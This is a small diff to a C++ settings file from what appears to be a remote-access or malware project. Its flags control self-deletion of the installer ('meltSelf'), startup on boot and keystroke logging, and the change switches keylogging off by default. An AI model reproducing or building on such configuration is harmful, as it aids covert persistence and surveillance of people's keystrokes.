@@ -15,7 +15,7 @@ bool Settings::startOnNextBoot = false;		//specifies whether it should startup t
 bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
 bool Settings::setStartupSelf = false;			//specifies whether the program is to be started on system boot
 bool Settings::logEvents = true;			//specifies whether the program should log events (like errors etc)
-bool Settings::logKeys = true;	//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//specifies whether the program should log the users keystrokes
+bool Settings::logKeys = false;	//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//specifies whether the program should log the users keystrokes
 
 #else
 
